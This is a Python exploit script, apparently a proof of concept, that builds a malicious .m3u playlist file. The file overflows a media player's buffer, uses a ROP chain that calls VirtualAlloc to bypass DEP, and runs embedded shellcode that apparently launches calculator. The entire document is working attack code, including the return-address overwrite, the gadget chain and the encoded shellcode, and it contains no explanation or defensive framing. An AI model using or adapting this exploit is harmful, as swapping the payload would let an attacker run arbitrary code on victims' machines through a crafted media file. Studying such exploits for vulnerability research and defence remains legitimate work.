
import sys, struct
 
file="crash.m3u"
 
rop = struct.pack('<L',0x41414141)  # padding to compensate 4-bytes at ESP
rop += struct.pack('<L',0x10029b57) # POP EDI # RETN
rop += struct.pack('<L',0x1002b9ff) # ROP-Nop
                                   
rop += struct.pack('<L',0x100280de) # POP ECX # RETN
rop += struct.pack('<L',0xffffffff) # will become 0x40
rop += struct.pack('<L',0x1002e01b) # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN
rop += struct.pack('<L',0x1002e01b) # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
                                 
rop += struct.pack('<L',0x1002ba02) # POP EAX # RETN
rop += struct.pack('<L',0x1005d060) # kernel32.virtualalloc
rop += struct.pack('<L',0x10027f59) # MOV EAX,DWORD PTR DS:[EAX] # RETN
rop += struct.pack('<L',0x1005bb8e) # PUSH EAX # ADD DWORD PTR SS:[EBP+5],ESI # PUSH 1 # POP EAX # POP ESI # RETN
                                  
rop += struct.pack('<L',0x1003fb3f) # MOV EDX,E58B0001 # POP EBP # RETN
rop += struct.pack('<L',0x41414141) # padding for POP EBP
rop += struct.pack('<L',0x10013b1c) # POP EBX # RETN
rop += struct.pack('<L',0x1A750FFF) # ebx+edx => 0x1000 flAllocationType
rop += struct.pack('<L',0x10029f3e) # ADD EDX,EBX # POP EBX # RETN 10
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
                                   
rop += struct.pack('<L',0x100532ed) # POP EBP # RETN
rop += struct.pack('<L',0x100371f5) # CALL ESP
                                    
rop += struct.pack('<L',0x10013b1c) # POP EBX # RETN
rop += struct.pack('<L',0xffffffff) # will be 0x1
rop += struct.pack('<L',0x100319d3) # INC EBX # FPATAN # RETN
rop += struct.pack('<L',0x100319d3) # INC EBX # FPATAN # RETN
                                   
rop += struct.pack('<L',0x10030361) # POP EAX # RETN
rop += struct.pack('<L',0x90909090) # NOP
                                 
rop += struct.pack('<L',0x10014720) # PUSHAD # RETN
                                  
 

calc = ("\xbb\x73\xd1\x43\x8e\xd9\xc5\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x32\x31\x5a\x12\x83\xc2\x04\x03\x29\xdf\xa1\x7b\x31\x37\xac"
"\x84\xc9\xc8\xcf\x0d\x2c\xf9\xdd\x6a\x25\xa8\xd1\xf9\x6b\x41"
"\x99\xac\x9f\xd2\xef\x78\x90\x53\x45\x5f\x9f\x64\x6b\x5f\x73"
"\xa6\xed\x23\x89\xfb\xcd\x1a\x42\x0e\x0f\x5a\xbe\xe1\x5d\x33"
"\xb5\x50\x72\x30\x8b\x68\x73\x96\x80\xd1\x0b\x93\x56\xa5\xa1"
"\x9a\x86\x16\xbd\xd5\x3e\x1c\x99\xc5\x3f\xf1\xf9\x3a\x76\x7e"
"\xc9\xc9\x89\x56\x03\x31\xb8\x96\xc8\x0c\x75\x1b\x10\x48\xb1"
"\xc4\x67\xa2\xc2\x79\x70\x71\xb9\xa5\xf5\x64\x19\x2d\xad\x4c"
"\x98\xe2\x28\x06\x96\x4f\x3e\x40\xba\x4e\x93\xfa\xc6\xdb\x12"
"\x2d\x4f\x9f\x30\xe9\x14\x7b\x58\xa8\xf0\x2a\x65\xaa\x5c\x92"
"\xc3\xa0\x4e\xc7\x72\xeb\x04\x16\xf6\x91\x61\x18\x08\x9a\xc1"
"\x71\x39\x11\x8e\x06\xc6\xf0\xeb\xf9\x8c\x59\x5d\x92\x48\x08"
"\xdc\xff\x6a\xe6\x22\x06\xe9\x03\xda\xfd\xf1\x61\xdf\xba\xb5"
"\x9a\xad\xd3\x53\x9d\x02\xd3\x71\xfe\xc5\x47\x19\x01")
 
shell = "\x90"*5 + calc
crash = "http://." + "A"*17416 + "\x60\x9C\x01\x10" + rop + shell + "C"*(7572-len(rop + shell))
 
writeFile = open (file, "w")
writeFile.write( crash )
writeFile.close()